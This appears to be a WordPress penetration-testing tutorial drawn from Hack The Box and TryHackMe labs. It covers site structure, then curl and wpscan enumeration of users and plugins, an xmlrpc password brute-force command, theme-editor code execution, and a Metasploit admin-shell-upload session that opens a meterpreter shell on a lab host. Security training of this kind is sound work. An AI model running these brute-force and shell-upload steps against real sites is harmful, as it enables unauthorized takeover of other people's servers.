#          🔥Hacking-Wordpress 🔥
![wordpress-hacking](https://user-images.githubusercontent.com/79256105/165776319-f7d73fb8-6bd9-4847-97da-461b641fbfe0.png)

# Basic Wordpress and Wordpress Structure
### 🔥Wordpress Structure 🔥

WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at /var/www/html.

Below is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly.


     tree -L 1 /var/www/html

     ├── index.php
     ├── license.txt
     ├── readme.html
     ├── wp-activate.php
     ├── wp-admin
     ├── wp-blog-header.php
     ├── wp-comments-post.php
     ├── wp-config.php
     ├── wp-config-sample.php
     ├── wp-content
     ├── wp-cron.php
     ├── wp-includes
     ├── wp-links-opml.php
     ├── wp-load.php
     ├── wp-login.php
     ├── wp-mail.php
     ├── wp-settings.php
     ├── wp-signup.php
     ├── wp-trackback.php
     └── xmlrpc.php

## 👽 Key WordPress Files ♀️

The root directory of WordPress contains files that are needed to configure WordPress to function correctly.

    index.php is the homepage of WordPress.

    license.txt contains useful information such as the version WordPress installed.

    wp-activate.php is used for the email activation process when setting up a new WordPress site.

    wp-admin folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths:
    /wp-admin/login.php
    /wp-admin/wp-login.php
    /login.php
    /wp-login.php

This file can also be renamed to make it more challenging to find the login page.

    xmlrpc.php is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress REST API.
WordPress Configuration File
## WordPress Configuration File
    The wp-config.php file contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
wp-config.php


    Code: php

    <?php
    /** <SNIP> */
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'database_name_here' );

    /** MySQL database username */
    define( 'DB_USER', 'username_here' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'password_here' );

    /** MySQL hostname */
     define( 'DB_HOST', 'localhost' );

     /** Authentication Unique Keys and Salts */
      /* <SNIP> */
     define( 'AUTH_KEY',         'put your unique phrase here' );
     define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
     define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
     define( 'NONCE_KEY',        'put your unique phrase here' );
     define( 'AUTH_SALT',        'put your unique phrase here' );
     define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
     define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
     define( 'NONCE_SALT',       'put your unique phrase here' );

     /** WordPress Database Table prefix */
     $table_prefix = 'wp_';

     /** For developers: WordPress debugging mode. */
    /** <SNIP> */
    define( 'WP_DEBUG', false );

    /** Absolute path to the WordPress directory. */
     if ( ! defined( 'ABSPATH' ) ) {
     define( 'ABSPATH', __DIR__ . '/' );
    }

    /** Sets up WordPress vars and included files. */
    require_once ABSPATH . 'wp-settings.php';

# Key WordPress Directories
The wp-content folder is the main directory where plugins and themes are stored. The subdirectory uploads/ is usually where any files uploaded to the platform are stored. These directories and files should be carefully enumerated as they may lead to contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities or misconfigurations.
    
#### WP-Content

    tree -L 1 /var/www/html/wp-content

    ├── index.php
    ├── plugins
    └── themes
 
#### WP-Includes

wp-includes contains everything except for the administrative components and the themes that belong to the website. This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.

   
     tree -L 1 /var/www/html/wp-includes

     ├── theme.php
     ├── update.php
     ├── user.php
     ├── vars.php
     ├── version.php
     ├── widgets
     ├── widgets.php
     ├── wlwmanifest.xml
     ├── wp-db.php
     └── wp-diff.php
     
 
# WordPress User Roles 

There are five types of users in a standard WordPress installation.

     Role 	          Description
     Administrator 	This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as                         editing source code.
     Editor 	     An editor can publish and manage posts, including the posts of other users.
     Author 	     Authors can publish and manage their own posts.
     Contributor 	These users can write and manage their own posts but cannot publish them.
     Subscriber 	These are normal users who can browse posts and edit their profiles.


Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.
 
 
# 🥇Enumeration Procedure For Wordpress Website in Manually

### Wordpress Version Check

Check Wordpress Version using given below curl command or seeing source code

    commnad:
            curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
        
 Also check WP Version - CSS and WP Version - JS version from Source Code 
 
### ▶️ Plugins and Themes Enumeration

Commnad For Plugins: 
      
      curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
Command For Themmes:
      
      curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
      
    
#### ⏩ User Enumeration
Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack. If successful, we may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server.

Command :
        
        curl http://blog.inlanefreight.com/wp-json/wp/v2/users
         
         
 
# ⤵️Enumeration Procedure For Wordpress Website in Automatically Using wpscan
WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It is installed by default on Parrot OS ,Kali OS but can also be installed manually with gem
         gem install wpscan
Once the installation completes, we can issue a command such as ***wpscan*** --hh to verify the installation. This command will show us the usage menu with all of the available command-line switches available.
### 🔥Enumerating a Website with WPScan ⚛️
The --enumerate flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, ***WPScan enumerates vulnerable plugins, themes, users, media, and backups***. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let's run a normal enumeration scan against a WordPress website.
Command :

            wpscan --url http://blog.inlanefreight.com --enumerate --api-token api-token-value
Example :
 
            wpscan --url http://10.129.2.37/ --enumerate --api-token cs0QRHwsYE6RvLd6SaHDhI1dmNX8ZVLEx0Fb7mNid9s
            
      
##### 👀Note: Api Token Generator Link https://wpscan.com/


# ✔️ Exploiting a Vulnerable Plugin
If we are checking and testing properly of our target wordpress website and if  target wordpress website is vulneable we will see some CVE or Exploite information after using above wpscan command
### ☑️WordPress User Bruteforce
WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.

Command :
          
          wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
          
#### 👁️Note: use username and password in http://sitename/login path
          
# 🔥Remote Code Execution (RCE) via the Theme Editor 🔥

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.

# 🔥Attacking WordPress with Metasploit 🔥
We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.
###### To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:

        msf5 > search wp_admin

###### Matching Modules

0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
###### Module Selection:
msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >

###### Module Options
                  
        msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

##### Module options (exploit/unix/webapp/wp_admin_shell_upload):


       PASSWORD                    yes       The WordPress password to authenticate with
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      80               yes       The target port (TCP)
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /                yes       The base path to the wordpress application
       USERNAME                    yes       The WordPress username to authenticate with
       VHOST                       no        HTTP server virtual host


Exploit target:

       Id  Name
       --  ----
       0   WordPress
    
#### set and Exploitation
   
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

meterpreter > getuid
Server username: www—data (33)
## 🙏Practicing Sites:
                  https://tryhackme.com/room/allinonemj
                  https://tryhackme.com/room/wordpresscve202129447
                  https://tryhackme.com/room/blog
                  
## 🎆 Website Security Testing Site:
                                   https://sitecheck.sucuri.net/
                                    
## 💠 Happy Hackings 🔡

## ℹ️  Source: Hack The Box Accademy and Try Hack Me 🔽
